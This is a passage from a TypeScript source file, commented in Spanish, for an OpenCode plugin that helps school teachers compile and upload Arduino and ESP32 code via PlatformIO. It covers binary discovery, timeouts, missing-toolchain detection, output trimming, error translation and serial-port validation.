/// <reference path="../env.d.ts" />
import { tool } from "@opencode-ai/plugin"
import { createHash } from "node:crypto"
import { existsSync, lstatSync, mkdirSync, readdirSync, readFileSync, statSync, writeFileSync } from "node:fs"
import { homedir } from "node:os"
import { isAbsolute, join, resolve, win32 } from "node:path"

interface RunResult {
  code: number
  stdout: string
  stderr: string
}

// PlatformIO casi nunca queda en el PATH tras instalarse (ni en Linux ni en Windows).
// Buscamos el binario en las rutas de instalación conocidas antes de caer al PATH.
//
// Solo se cachea una ruta REAL. La primera version cacheaba tambien el fallback
// "pio": si el tool arrancaba sin PlatformIO, se quedaba con "pio" para siempre y
// despues de que `reparar` lo instalara seguia sin encontrarlo (y `compile`
// fallaba hasta reiniciar OpenCode).
let pioPathCache: string | null = null

/** Saca vacíos y repetidos preservando el orden: el primero que aparece manda. */
const unicos = (xs: Array<string | undefined>): string[] => [
  ...new Set(xs.filter((x): x is string => typeof x === "string" && x.trim() !== "")),
]

/**
 * TRES LUGARES DONDE BUSCAR, NO UNO — la misma lección que el lanzador aprendió
 * buscando OpenCode (`installer/abrir-tecnia-bot.cmd`) y que este comentario, en
 * plural, prometía sobre una lista de UN elemento durante meses.
 *
 * EL CASO REAL (escuela Juana Manso, 2026-09-08). La usuaria de Windows se llama
 * `Dirección310`, con `ó`, que no es ASCII. PlatformIO Core no soporta rutas con
 * caracteres no-ASCII —sus toolchains de gcc se rompen— así que en Windows, y a
 * propósito, RELOCALIZA su core_dir a la raíz del disco. El instalador oficial
 * dejó escrito en pantalla:
 *
 *     Creating a virtual environment at C:\.platformio\penv
 *     The full path to platformio.exe is C:\.platformio\penv\Scripts\platformio.exe
 *
 * Nosotros mirábamos SOLO `$HOME\.platformio` y le dijimos a una docente durante
 * TRES SEMANAS que PlatformIO no estaba instalado. Lo tenía, y andaba: `pio.exe
 * --version` contestaba «PlatformIO Core, version 6.2.0».
 *
 * Por eso esto es una LISTA ORDENADA, no una ruta:
 *   1. `PLATFORMIO_CORE_DIR` si está seteada (lo que el usuario mandó, gana)
 *   2. `$HOME\.platformio` (la instalación normal)
 *   3. la raíz del disco de $HOME (`C:\.platformio`) <- el caso de arriba
 *   4. `C:\.platformio` fijo, por si $HOME vive en otro disco
 *   5. el PATH, que lo resuelve `pioBin()`/`pioDisponible()` al final
 *
 * En cada carpeta se miran `pio.exe` Y `platformio.exe` (en Unix `pio` y
 * `platformio`): los dos suelen existir, pero el mensaje del instalador oficial
 * nombra `platformio.exe`, y no queremos depender de que exista justo el que
 * elegimos nosotros.
 *
 * La relocalización a la raíz del disco es SOLO de Windows: en Linux/macOS las
 * rutas del home no rompen a gcc y PlatformIO no mueve nada. No la inventamos.
 *
 * ACÁ NO SE PREGUNTA `--version`, Y ES A PROPÓSITO. Este código está en el camino
 * caliente del tool y ya cachea: alcanza con quedarse con el primero que EXISTE.
 * Un pio a medio armar se manifiesta igual en el primer comando de verdad, con su
 * error real. Los scripts de instalación y el diagnóstico sí le preguntan
 * `--version` al primer candidato, porque corren una sola vez y ahí ese segundo
 * de más compra la diferencia entre "está" y "anda". Si venís a "arreglar" esta
 * asimetría: es deliberada.
 *
 * Toma home/plataforma/entorno por parámetro para poder probar el caso de
 * `Dirección310` desde Linux; sin argumentos se comporta como siempre.
 */
export function pioCandidatos(
  home: string = homedir(),
  plataforma: string = process.platform,
  entorno: Record<string, string | undefined> = process.env,
): string[] {
  const core = entorno.PLATFORMIO_CORE_DIR
  if (plataforma === "win32") {
    // win32.parse("C:\\Users\\Dirección310").root === "C:\\" — y anda también
    // corriendo bajo Linux, que es como lo prueban los tests.
    const raiz = win32.parse(home).root
    const dirs = unicos([core, win32.join(home, ".platformio"), raiz && win32.join(raiz, ".platformio"), "C:\\.platformio"])
    return dirs.flatMap((d) => ["pio.exe", "platformio.exe"].map((n) => win32.join(d, "penv", "Scripts", n)))
  }
  const dirs = unicos([core, join(home, ".platformio")])
  return dirs.flatMap((d) => ["pio", "platformio"].map((n) => join(d, "penv", "bin", n)))
}

export function resetPioCache(): void {
  pioPathCache = null
}

export function pioBin(): string {
  if (pioPathCache) return pioPathCache
  for (const candidate of pioCandidatos()) {
    if (existsSync(candidate)) {
      pioPathCache = candidate
      return candidate
    }
  }
  return "pio" // fallback: confiar en el PATH del sistema (sin cachear)
}

// Resuelve de nuevo, sin cache: hay binario en las rutas conocidas o en el PATH.
// Nunca hace existsSync("pio"): eso mira un archivo relativo al cwd, no el PATH.
export function pioDisponible(): boolean {
  resetPioCache()
  // El PATH se prueba con los DOS nombres: el instalador oficial deja los dos y
  // hubo maquinas donde el shim del PATH era `platformio` y no `pio`.
  return (
    pioCandidatos().some((c) => existsSync(c)) || Bun.which("pio") !== null || Bun.which("platformio") !== null
  )
}

/*
 * CUANTO SE ESPERA A CADA COMANDO, y por que dos numeros distintos.
 *
 * La primera vez que se compila para una placa nueva, `pio run` baja el
 * toolchain entero (cientos de MB) con una barra de progreso que por el pipe no
 * se ve: minutos de silencio total. En el aula eso se leia como "se colgo", y
 * sin timeout la unica salida era cerrar OpenCode. Con 15 minutos alcanza para
 * cualquier red que anda; si no termina, se lo decimos en vez de esperar para
 * siempre. Lo mismo vale para la carga: `tool-avrdude`/`esptool` se bajan en
 * el PRIMER upload, no en el compile.
 *
 * Los comandos de consulta (`pio --version`, `pio device list`, PowerShell)
 * tardan segundos: si a los 60 s no contestaron, algo esta roto.
 *
 * Se puede cambiar por variable de entorno, `TECNIA_PIO_TIMEOUT_MS`: la usan los
 * tests para probar el camino del timeout sin esperar 15 minutos, y una escuela
 * con red lenta la puede subir. Un valor que no es un numero positivo ("abc",
 * "0") se ignora, como si no estuviera.
 */
const TIMEOUT_CORTO_MS = 60_000
const TIMEOUT_LARGO_MS = 15 * 60_000
/** Los ms que pidio `TECNIA_PIO_TIMEOUT_MS`, o null si no esta o no sirve. */
function timeoutPedidoMs(): number | null {
  const n = Math.floor(Number(process.env.TECNIA_PIO_TIMEOUT_MS))
  // AbortSignal.timeout exige un entero de 32 bits con signo: con decimales o con
  // mas de 2^31-1 tira ERR_OUT_OF_RANGE (o corta al instante) en vez de esperar.
  return process.env.TECNIA_PIO_TIMEOUT_MS && Number.isFinite(n) && n > 0 ? Math.min(n, 2 ** 31 - 1) : null
}
export function timeoutLargoMs(): number {
  return timeoutPedidoMs() ?? TIMEOUT_LARGO_MS
}

/*
 * Si las herramientas de la placa NO estan bajadas, compilar es en realidad bajar
 * mas de 1 GB. Desde 0.4.6 eso lo hace el instalador; si igual faltan, es que la
 * descarga del instalador no llego, y con la red del aula tampoco va a llegar
 * desde el bot: esperar 15 minutos para enterarse es lo que trabo a la docente
 * del taller. Se espera poco y se explica. Con buena red (en casa la descarga
 * entera tardo unos 3 minutos) puede llegar a terminar igual.
 *
 * Si `TECNIA_PIO_TIMEOUT_MS` esta, manda ELLA, tambien hacia arriba. La primera
 * version hacia `Math.min(variable, 3 min)` con faltantes: una escuela con red
 * lenta que la subia a 40 minutos para dejar terminar la descarga se quedaba
 * igual con 3, sin forma de cambiarlo. Quien setea la variable sabe lo que pide.
 * Sin la variable: 3 minutos si faltan herramientas, 15 si no.
 */
const TIMEOUT_SIN_HERRAMIENTAS_MS = 3 * 60_000
export function timeoutCompilarMs(faltaban: string[]): number {
  return timeoutPedidoMs() ?? (faltaban.length > 0 ? TIMEOUT_SIN_HERRAMIENTAS_MS : TIMEOUT_LARGO_MS)
}

/** Lo que devuelve `run()` cuando el comando no termino a tiempo (mismo codigo que `timeout(1)`). */
export const CODIGO_TIMEOUT = 124
/** Lo que devuelve `run()` cuando el usuario corto la accion desde OpenCode (Ctrl+C: 128+SIGINT). */
export const CODIGO_CANCELADO = 130

/**
 * Una sola senal que se dispara si CUALQUIERA de las dos se dispara. Bun trae
 * `AbortSignal.any` en las versiones nuevas; si no esta, se compone a mano.
 */
function combinarSignals(...signals: Array<AbortSignal | undefined>): AbortSignal {
  const lista = signals.filter((s): s is AbortSignal => s !== undefined)
  const anyFn = (AbortSignal as unknown as { any?: (s: AbortSignal[]) => AbortSignal }).any
  if (typeof anyFn === "function") return anyFn.call(AbortSignal, lista)
  const ctrl = new AbortController()
  for (const s of lista) {
    if (s.aborted) {
      ctrl.abort(s.reason)
      break
    }
    s.addEventListener("abort", () => ctrl.abort(s.reason), { once: true })
  }
  return ctrl.signal
}

/**
 * Corre un comando y devuelve codigo + salida, sin colgarse.
 *
 * El ORDEN importa: stdout y stderr se leen ANTES de esperar `exited`. Al reves,
 * el proceso se bloquea al llenar el buffer del pipe y el tool espera a un
 * proceso que espera al tool.
 *
 * El timeout y el `ctx.abort` de OpenCode se combinan en una sola senal: se le
 * pasa a Bun (que mata el proceso) Y se corre una carrera contra la lectura,
 * porque si el proceso ignora la senal —o quedo colgado en una descarga— los
 * pipes no se cierran nunca y `await` no vuelve.
 */
export async function run(
  cmd: string[],
  cwd: string,
  signal?: AbortSignal,
  timeoutMs: number = TIMEOUT_CORTO_MS,
): Promise<RunResult> {
  // Resolvemos "pio" a la ruta real del binario (PATH-independiente)
  if (cmd[0] === "pio") cmd = [pioBin(), ...cmd.slice(1)]
  const porTiempo = AbortSignal.timeout(timeoutMs)
  const corte = combinarSignals(signal, porTiempo)
  const resultadoCorte = (): RunResult =>
    porTiempo.aborted
      ? {
          code: CODIGO_TIMEOUT,
          stdout: "",
          stderr: `El comando no termino en ${describirDuracion(timeoutMs)} y se corto: ${cmd.join(" ")}`,
        }
      : { code: CODIGO_CANCELADO, stdout: "", stderr: "Cancelado por el usuario." }

  if (corte.aborted) return resultadoCorte()

  const lanzar = () => Bun.spawn(cmd, { cwd, stdout: "pipe", stderr: "pipe", signal: corte })
  let proc: ReturnType<typeof lanzar>
  try {
    proc = lanzar()
  } catch {
    return { code: 127, stdout: "", stderr: "command not found" }
  }

  const lectura = (async (): Promise<RunResult> => {
    const [stdout, stderr] = await Promise.all([
      new Response(proc.stdout).text(),
      new Response(proc.stderr).text(),
    ])
    const code = await proc.exited
    return { code, stdout, stderr }
  })()
  // Nunca rechaza: si gana la carrera, el resultado se arma abajo.
  const cortado = new Promise<"cortado">((resolve) => corte.addEventListener("abort", () => resolve("cortado"), { once: true }))

  const ganador = await Promise.race([lectura, cortado])
  if (ganador !== "cortado") return ganador

  // Por si Bun no lo mato solo (o el mock de los tests no lo hace).
  try {
    proc.kill()
  } catch {
    /* ya estaba muerto */
  }
  // Que la lectura pendiente no quede como rechazo sin atender si el pipe revienta al matarlo.
  lectura.catch(() => {})
  return resultadoCorte()
}

function describirDuracion(ms: number): string {
  if (ms >= 60_000) {
    const min = Math.round(ms / 60_000)
    return `${min} minuto${min === 1 ? "" : "s"}`
  }
  return `${Math.max(1, Math.round(ms / 1000))} segundo${ms >= 1500 ? "s" : ""}`
}

/**
 * Como se consiguen las herramientas de la placa: el camino que de verdad las BAJA.
 *
 * Es el instalador completo. En Windows, "Reparar Tecnia Bot" (el acceso del menu
 * inicio, que corre bootstrap.ps1) o volver a correr Instalar-Tecnia-Bot.exe.
 * `/actualizar` NO sirve: update.ps1 pone TECNIA_DESDE_ACTUALIZAR=1 y ahi el
 * instalador solo avisa, porque se corre en clase y sin progreso a la vista. La
 * primera version de este mensaje decia "Actualizar Tecnia Bot con buena red" y
 * mandaba al docente justo al unico camino que no las baja.
 *
 * El mismo consejo vive en `$comoConseguirlas` de install.ps1 y en `como` de
 * install.sh: si cambia uno, cambian los tres.
 */
function comoBajarlas(plataforma: string): string {
  return plataforma === "win32"
    ? "Con buena red (por ejemplo en casa), correr \"Reparar Tecnia Bot\" desde el menú inicio, o volver a correr el instalador `Instalar-Tecnia-Bot.exe`: las baja una sola vez y quedan para siempre. Ojo: `/actualizar` NO las baja."
    : "Con buena red (por ejemplo en casa), volver a correr el instalador (`bash install/install.sh` en la carpeta de Tecnia Bot): las baja una sola vez y quedan para siempre. Ojo: `/actualizar` NO las baja."
}

/**
 * Lo que se le dice al docente (y al bot) cuando compilar o cargar no termino a tiempo.
 *
 * La causa casi siempre es la descarga inicial de las herramientas de la placa
 * (mas de 1 GB para ESP32), que por el pipe no muestra progreso. ANTES este
 * mensaje decia "proba de nuevo, la segunda vez es rapido", y el bot lo hacia
 * solo: en el taller del 2026-10-14 una docente espero 15 minutos, el bot
 * reintento y espero otros 15 (log de Windows, sesion ses_ec459b9f). La segunda
 * vez NO fue rapida: con la red del aula la descarga tampoco termino. Por eso el
 * mensaje ahora le dice al bot que no reintente y al docente como bajarlas una
 * sola vez.
 *
 * El pendrive nombra la carpeta REAL de destino, la de `coreDir()`. Decir "la
 * carpeta del usuario" mandaba a copiar al lugar equivocado justo en la maquina
 * donde PlatformIO usa `C:\.platformio`: lo copiado no se veia y seguia bajando.
 *
 * Exportada solo para los tests: home/plataforma vienen de afuera para probar el
 * texto de Windows desde Linux.
 */
export function mensajeTimeout(
  que: "compilar" | "cargar el codigo",
  timeoutMs: number,
  faltaban: string[] = [],
  core: string = coreDir(),
  plataforma: string = process.platform,
): string {
  const causa =
    faltaban.length > 0
      ? `Faltaban las herramientas de ${faltaban.join(" y ")}, y PlatformIO las estaba bajando (para ESP32 es más de 1 GB la primera vez): con esta red no llegó.`
      : "Lo más probable es que PlatformIO estuviera bajando herramientas sin mostrar progreso, o que se haya colgado."
  return (
    `No termine de ${que} en ${describirDuracion(timeoutMs)}. ${causa}\n\n` +
    "NO lo vuelvas a intentar ahora: otro intento con la misma red vuelve a tardar lo mismo, " +
    "y no ofrezcas un diagnóstico en lugar de esto. Pasale al docente estas opciones, con tus palabras:\n" +
    `1. ${comoBajarlas(plataforma)}\n` +
    "2. Traerlas en un pendrive desde una computadora donde ya compila: copiar las carpetas `packages` y " +
    `\`platforms\` de la carpeta \`.platformio\` de esa computadora adentro de \`${core}\` en esta.\n` +
    "Si ya estaban bajadas y aun así no termina, ahí sí corré `/diagnostico`: puede ser la red de la escuela bloqueando las descargas."
  )
}

/**
 * Cuando en "compilar y cargar" la compilacion TERMINO BIEN y lo que se corto fue
 * la carga. Ahi las herramientas de compilar ya estaban (si no, no compilaba):
 * hablarle de herramientas faltantes y de pendrive manda al docente a resolver un
 * problema que no tiene. Lo que queda es la carga misma: una placa que no
 * contesta, o la herramienta de carga (esptool/avrdude, pocos MB) que PlatformIO
 * baja la primera vez que carga.
 */
export function mensajeTimeoutCarga(timeoutMs: number): string {
  return (
    `La compilación terminó bien, pero no termine de cargar el codigo en ${describirDuracion(timeoutMs)}. ` +
    "Puede ser que la placa no conteste, o que PlatformIO estuviera bajando la herramienta de carga (pocos MB, solo la primera vez).\n\n" +
    "NO lo vuelvas a intentar ahora por tu cuenta. Pedile al docente que revise el cable USB (que sea de datos, no solo de carga) " +
    "y que la placa sea la del puerto elegido; si es un ESP32, que mantenga apretado el botón BOOT cuando arranca la carga. " +
    "Cuando te diga que está, ahí sí probá cargar de nuevo."
  )
}

/*
 * QUE HERRAMIENTAS NECESITA CADA PLACA, para avisar ANTES de que la primera
 * compilacion se ponga a bajar mas de 1 GB en silencio. Son los paquetes que
 * PlatformIO baja la primera vez para cada plataforma (los mas pesados).
 *
 * SOLO LAS QUE BAJA EL INSTALADOR, y segun el `board`. La primera version pedia
 * `toolchain-xtensa-esp32` para todo `platform = espressif32`, pero ese compilador
 * es solo del ESP32 clasico: una ESP32-C3 usa `toolchain-riscv32-esp` y una S3
 * `toolchain-xtensa-esp32s3`. En una computadora que ya habia compilado una C3
 * (sin la descarga del instalador), el aviso decia "faltan" PARA SIEMPRE y, con el
 * corte de 3 minutos, cada compilacion quedaba limitada a 3 minutos.
 *
 * La regla: lo COMUN a toda la plataforma se pide siempre (el framework Arduino de
 * espressif32 es uno solo para todas las variantes; el compilador AVR, uno para
 * todas las AVR) y lo que depende del chip, solo para los `board` del catalogo
 * (skill `placas`) que el instalador deja listos: esp32dev, uno y micro.
 *
 * Se descarto deducir el chip del nombre del board: hay cientos de ids
 * (`lolin_s3`, `heltec_wifi_lora_32_V3` que es una S3 sin decirlo) y adivinar se
 * equivoca. Y aunque se acertara, el mensaje de faltantes manda a correr el
 * instalador, que NO baja el compilador de una C3: avisar de algo que el camino
 * propuesto no arregla seria otro mensaje falso. Con una placa fuera del
 * catalogo, lo peor que pasa es que no se avisa y se espera como antes (15 min).
 */
const HERRAMIENTAS_POR_PLATAFORMA: Array<{
  plataforma: RegExp
  nombre: string
  paquetes: string[]
  porPlaca: Map<string, string[]>
}> = [
  {
    plataforma: /^\s*platform\s*=\s*(platformio\/)?espressif32\b/m,
    nombre: "ESP32",
    paquetes: ["framework-arduinoespressif32"],
    porPlaca: new Map([["esp32dev", ["toolchain-xtensa-esp32"]]]),
  },
  {
    plataforma: /^\s*platform\s*=\s*(platformio\/)?atmelavr\b/m,
    nombre: "Arduino UNO",
    paquetes: ["toolchain-atmelavr"],
    // El ATmega32U4 de la Micro (Mis Ladrillos) y la Nano (skill arduino) usan el
    // mismo core Arduino AVR que el UNO.
    porPlaca: new Map([
      ["uno", ["framework-arduino-avr"]],
      ["micro", ["framework-arduino-avr"]],
      ["nanoatmega328", ["framework-arduino-avr"]],
    ]),
  },
]

/** Lo mismo que el `os.path.isdir` con que PlatformIO decide: un ARCHIVO con ese nombre no cuenta. */
export function esCarpeta(ruta: string): boolean {
  try {
    return statSync(ruta, { throwIfNoEntry: false })?.isDirectory() ?? false
  } catch {
    return false
  }
}

/**
 * La carpeta donde PlatformIO guarda `packages`, con SU regla y no deducida del pio.
 *
 * Antes salia de la ruta de pio.exe, y no es lo mismo: PlatformIO usa
 * `C:\.platformio` si esa carpeta EXISTE, aunque el penv este en el perfil del
 * usuario (platformio/project/options.py, get_default_core_dir). Paso en la VM:
 * con un `C:\.platformio` viejo, el aviso de descarga miraba la carpeta del
 * usuario mientras PlatformIO bajaba todo en la raiz del disco.
 *
 * La regla, en orden (la misma que usan install.ps1, install.sh y diagnostico.ps1):
 *   1. `PLATFORMIO_CORE_DIR`, si tiene algo. Vacia es como no tenerla: en
 *      Windows una variable vacia ni existe, y una ruta vacia no es una carpeta.
 *   2. Windows: `<raiz del disco del perfil>\.platformio` si es CARPETA (pio usa
 *      `isdir`: un archivo que se llame asi no cuenta). Con un perfil UNC
 *      (`\\servidor\perfiles\ana`) la raiz es `\\servidor\perfiles\`, igual
 *      que el `splitdrive` de Python.
 *   3. `<perfil>\.platformio`.
 *
 * Si el perfil llega vacio o relativo (un USERPROFILE roto), NO se arma una ruta
 * relativa: `.platformio` a secas se resolveria contra la carpeta del proyecto y
 * el aviso miraria cualquier cosa. En Windows se cae a `C:\.platformio`, que es
 * a donde PlatformIO se muda cuando el perfil no le sirve; en Linux a
 * `/.platformio` (homedir() en Linux siempre es absoluto, esto es solo un piso).
 */
export function coreDir(
  home: string = homedir(),
  plataforma: string = process.platform,
  entorno: Record<string, string | undefined> = process.env,
  esCarpetaFn: (ruta: string) => boolean = esCarpeta,
): string {
  if (entorno.PLATFORMIO_CORE_DIR) return entorno.PLATFORMIO_CORE_DIR
  if (plataforma !== "win32") return join(isAbsolute(home) ? home : "/", ".platformio")
  // "C:foo" no es absoluto y su root es "C:", que armaria "C:.platformio": relativa.
  const absoluto = win32.isAbsolute(home) && win32.parse(home).root.length > 1
  const enRaiz = win32.join(absoluto ? win32.parse(home).root : "C:\\", ".platformio")
  if (!absoluto) return enRaiz
  return esCarpetaFn(enRaiz) ? enRaiz : win32.join(home, ".platformio")
}

/** Las placas del `platformio.ini` cuyas herramientas todavia no estan bajadas. */
export function herramientasFaltantes(
  iniText: string,
  core: string,
  existe: (ruta: string) => boolean = existsSync,
): string[] {
  // Todos los `board =` del ini (puede haber un env por placa).
  const placas = [...iniText.matchAll(/^\s*board\s*=\s*([^\s;#]+)/gm)].map((m) => m[1] ?? "")
  return HERRAMIENTAS_POR_PLATAFORMA.filter((h) => {
    if (!h.plataforma.test(iniText)) return false
    const paquetes = [...h.paquetes, ...placas.flatMap((b) => h.porPlaca.get(b) ?? [])]
    return paquetes.some((p) => !existe(join(core, "packages", p)))
  }).map((h) => h.nombre)
}

/**
 * Recorta una salida larga para que llegue al modelo lo que sirve.
 *
 * POR QUE. Un `pio run` con warnings tira 3000 lineas por stderr. Todo eso iba
 * al chat, y `traducirError()` solo mira la primera linea con `error:`. El
 * modelo recibia una pared de texto para encontrar una linea.
 *
 * Que se conserva: las 15 lineas antes y despues del PRIMER `error:` (o
 * `Error`), que es donde esta el contexto del error de compilacion, y las
 * ultimas 10, que es donde PlatformIO dice como termino (`*** [upload] Error 1`,
 * `[FAILED] Took 3.21 seconds`). Lo demas se marca como omitido, con el numero,
 * para que se sepa que falta algo y cuanto.
 *
 * Es una funcion pura para poder probarla sin compilar nada. Y hay que llamar a
 * `traducirError()` con el texto COMPLETO, antes de recortar.
 */
export function recortarSalida(texto: string, maxLineas = 40): string {
  const lineas = texto.replace(/\r\n?/g, "\n").trimEnd().split("\n")
  if (lineas.length <= maxLineas) return lineas.join("\n")

  const CONTEXTO = 15
  const COLA = 10
  const n = lineas.length
  const marcar = (omitidas: number) => `… (${omitidas} línea${omitidas === 1 ? "" : "s"} omitida${omitidas === 1 ? "" : "s"})`

  const iError = lineas.findIndex((l) => /error:|Error/.test(l))
  // Rangos [desde, hasta) a conservar, en orden, sin solaparse.
  const rangos: Array<[number, number]> = []
  if (iError >= 0) rangos.push([Math.max(0, iError - CONTEXTO), Math.min(n, iError + CONTEXTO + 1)])
  else rangos.push([0, CONTEXTO])
  const cola: [number, number] = [Math.max(0, n - COLA), n]
  const ultimo = rangos[rangos.length - 1]!
  if (cola[0] <= ultimo[1]) ultimo[1] = n
  else rangos.push(cola)

  const salida: string[] = []
  let cursor = 0
  for (const [desde, hasta] of rangos) {
    if (desde > cursor) salida.push(marcar(desde - cursor))
    salida.push(...lineas.slice(desde, hasta))
    cursor = hasta
  }
  if (cursor < n) salida.push(marcar(n - cursor))
  return salida.join("\n")
}

// Envuelve un valor entre comillas dobles solo si contiene espacios (o esta vacio).
// Sirve tanto para cmd de Windows como para shells POSIX en rutas normales.
function quoteIfNeeded(value: string): string {
  return value === "" || /\s/.test(value) ? `"${value}"` : value
}

/**
 * WHITELIST de formas REALES de puerto serie, una por plataforma — falla
 * cerrada: si `puerto` no matchea NINGUNA, se rechaza. No hay un tercer caso
 * que acepte "lo que sea".
 *
 * De donde sale cada forma (no se inventan, se leen del propio repo):
 *   - Windows `COM<n>`: es el patron que ya usa `detectPort()` para leer la
 *     salida cruda de `pio device list` cuando el JSON no parsea (mas abajo,
 *     `/COM\d+/g`), y el ejemplo que da la propia descripcion del tool
 *     ("ej: COM3").
 *   - Unix `/dev/tty(USB|ACM)<n>`: el mismo fallback, rama Linux
 *     (`/\/dev\/tty(?:USB|ACM)\d+/g`).
 *   - Unix `/dev/cu.*` y `/dev/tty.*` con sufijo de nombre de chip: lo que
 *     pyserial (la libreria que usa `pio device list`) devuelve en macOS —
 *     `cu.usbserial-14140`, `cu.SLAB_USBtoUART`, `cu.Bluetooth-Incoming-Port` —
 *     por eso el sufijo permite letras, digitos, punto, guion y guion bajo (el
 *     alfabeto real de esos nombres) y nada mas: ni `$`, ni backtick, ni `;`,
 *     ni espacio, ni comillas.
 *
 * USADA SOLO en la rama de macOS de `monitor` (mas abajo, adentro de
 * `execute()`), que es la UNICA que arma un shell string — ver el comentario
 * ahi de por que no hace falta en Windows ni en Linux.
 */
const PUERTO_WINDOWS = /^COM\d+$/i
const PUERTO_UNIX = /^\/dev\/(?:tty|cu)[A-Za-z0-9._-]+$/
export function puertoValido(puerto: string): boolean {
  return PUERTO_WINDOWS.test(puerto) || PUERTO_UNIX.test(puerto)
}

// Lanza un proceso de forma "detached": no esperamos su salida ni bloqueamos la tool.
// Se usa para abrir una ventana de terminal aparte (Linux/Mac) sin colgar `run()`.
function launchDetached(cmd: string[], cwd: string): boolean {
  try {
    const proc = Bun.spawn(cmd, {
      cwd,
      stdin: "ignore",
      stdout: "ignore",
      stderr: "ignore",
    })
    proc.unref()
    return true
  } catch {
    return false
  }
}

export function traducirError(stderr: string, stdout: string): string {
  const texto = stderr + "\n" + stdout
  type Patron = [RegExp, string | ((m: RegExpMatchArray) => string)]
  const patrones: Patron[] = [
    [
      /'(.+?)' was not declared in this scope/,
      (m) =>
        `Usaste la variable o funcion '${m[1]}' pero no la declaraste antes. Revisa si esta bien escrita o si le falta declarar el tipo (ej: 'int ${m[1]}').`,
    ],
    [/expected ';' before/, "Falta un punto y coma `;` antes de esa linea. En Arduino/C++ cada instruccion termina con `;`."],
    [
      /fatal error:.*\.h: No such file or directory/,
      "No se encontro el archivo de la libreria. En `platformio.ini` agregala en `lib_deps`.",
    ],
    [
      /Please specify upload_port|Could not find serial port/,
      "No pude detectar el puerto del Arduino/ESP32. Desconectalo y volvelo a conectar, o ejecuta `/diagnostico` para ver los puertos disponibles.",
    ],
    [
      /command not found|is not recognized as an internal|exit code 127/,
      "PlatformIO no esta instalado o no esta en el PATH. Ejecuta `/diagnostico` para mas informacion.",
    ],
    [
      /Permission denied:.*\/dev\/tty/,
      "Sin permiso para usar el puerto serial. En Linux agregate al grupo del puerto (el nombre cambia segun la distro): en Debian/Ubuntu `sudo usermod -a -G dialout $USER`, en Arch/Manjaro `sudo usermod -a -G uucp $USER`. Despues cerra sesion y volve a entrar.",
    ],
    [
      /avrdude|not in sync|programmer is not responding/,
      "Problema al subir el codigo al Arduino. Verifica que el cable USB este bien conectado y que no haya otro programa usando el puerto.",
    ],
    [
      /Failed to connect to ESP32|Timed out waiting for packet header/,
      "El ESP32 no respondio. Apreta el boton BOOT mientras empieza la carga, soltalo cuando aparezca 'Connecting...'.",
    ],
    [
      /expected '}'|expected unqualified-id/,
      "Falta cerrar una llave `}` o hay un bloque mal cerrado. Revisa que cada `{` tenga su `}` correspondiente.",
    ],
    [
      /invalid conversion from|undefined reference to/,
      "Problema de tipos o funcion no definida. Verifica los tipos de tus variables y que todas las funciones esten implementadas.",
    ],

    /*
     * EL PRIMERO QUE SE CHOCA CUALQUIERA, y no estaba traducido.
     *
     * PlatformIO no compila un archivo suelto: quiere una carpeta con
     * `platformio.ini` y el codigo en `src/main.cpp`. Si el docente abrio
     * OpenCode en su escritorio y pidio codigo, `pio run` corta con este error
     * en ingles y nadie le explica que falta armar el proyecto.
     */
    [
      /Not a PlatformIO project|NotPlatformIOProjectError|platformio\.ini.*has not been found/i,
      "**Todavia no hay un proyecto de PlatformIO en esta carpeta.** PlatformIO no compila un " +
        "archivo suelto: necesita un `platformio.ini` que diga que placa es, y el codigo en " +
        "`src/main.cpp`. Se arman los dos y se compila de nuevo — el `platformio.ini` cambia " +
        "segun la placa (`board = uno` para Arduino UNO, `board = esp32dev` para ESP32).",
    ],
    /*
     * LOS TRES DEL ESP32 QUE NO SON ERRORES DE COMPILACION.
     *
     * Salen por el monitor serial DESPUES de cargar, cuando el programa ya
     * corre, y son los que un docente pega en el chat sin saber que significan.
     * Ninguno de los tres estaba reconocido: el bot recibia el texto crudo y
     * tenia que improvisar.
     *
     * El del brownout es el mas importante de todos: es lo que escupe la placa
     * la primera vez que alguien le conecta un servo, o sea la semana dos o tres
     * de cualquier curso.
     */
    [
      /Brownout detector was triggered/,
      "**Le falta corriente a la placa.** El ESP32 se apaga solo cuando la tension le baja, " +
        "y eso pasa casi siempre al conectar un servo, un motor o un rele: el USB no da abasto. " +
        "No es un problema del codigo. Solucion: fuente externa de 5V para el componente que " +
        "consume, con el GND unido al de la placa. Si es un servo, calcula con el consumo de " +
        "BLOQUEO (unos 700 mA en un SG90), no con el de movimiento libre.",
    ],
    [
      /rst:0x[0-9a-f]+.*boot:0x/i,
      "**La placa se esta reiniciando en bucle.** Ese `rst:0x...` es el motivo del reinicio que " +
        "imprime el ESP32 al arrancar. Las dos causas mas comunes en el aula: (1) le falta " +
        "corriente — ver si tambien aparece 'Brownout'; (2) hay algo conectado a un pin de " +
        "arranque (GPIO0, GPIO2, GPIO12 o GPIO15) que lo deja en el nivel equivocado al " +
        "encender. Probá desconectando todo del circuito y encendiendo la placa sola: si asi " +
        "arranca bien, es el cableado y no el programa.",
    ],
    [
      /Guru Meditation Error/,
      "**El programa se cayo mientras corria** (no es un error de compilacion). Las causas " +
        "tipicas: usar un puntero o un objeto que todavia no se inicializo, leer de una " +
        "libreria que fallo en `begin()` sin chequear el resultado, o escribir fuera de un " +
        "arreglo. Miralo asi: el mensaje aparece DESPUES de que el programa arranco, " +
        "asi que fijate que hizo justo antes de caerse — un `Serial.print` antes de cada paso " +
        "te dice hasta donde llego.",
    ],
  ]

  for (const [patron, mensaje] of patrones) {
    const match = texto.match(patron)
    if (match) return typeof mensaje === "function" ? mensaje(match) : mensaje
  }

  const primeraLinea = texto.split("\n").find((l) => l.includes("error:")) ?? stderr.split("\n")[0] ?? ""
  return `Error de compilacion: ${primeraLinea}\n\nConsulta el skill 'errores-comunes' para mas ayuda.`
}

interface Device {
  port: string
  hwid?: string
  description?: string
}

/**
 * Qué chip USB-serial hay del otro lado del cable, según su VID:PID.
 *
 * POR QUÉ IMPORTA ESTO EN UN AULA. Un docente conecta la placa y no pasa nada.
 * El problema casi nunca es la placa: es que Windows no trae el driver del chip
 * USB-serial que usan los clones baratos —el CH340— y sin driver no aparece
 * ningún puerto. Decirle "no encuentro tu Arduino" no lo ayuda; decirle "es un
 * CH340 y le falta el driver, bajalo de acá" lo desbloquea en dos minutos.
 *
 * Y HAY UN SEGUNDO PROBLEMA, más silencioso: `pio device list` devuelve TODOS
 * los puertos serie, no sólo las placas. En una máquina virtual aparece un COM1
 * emulado (`ACPI\PNP0501`) que no es nada — y el diagnóstico anterior lo contaba
 * como "dispositivo conectado". El docente veía todo en verde y la carga fallaba.
 *
 * Lo que NO se puede saber por el VID:PID es QUÉ PLACA es: un CH340 puede ser un
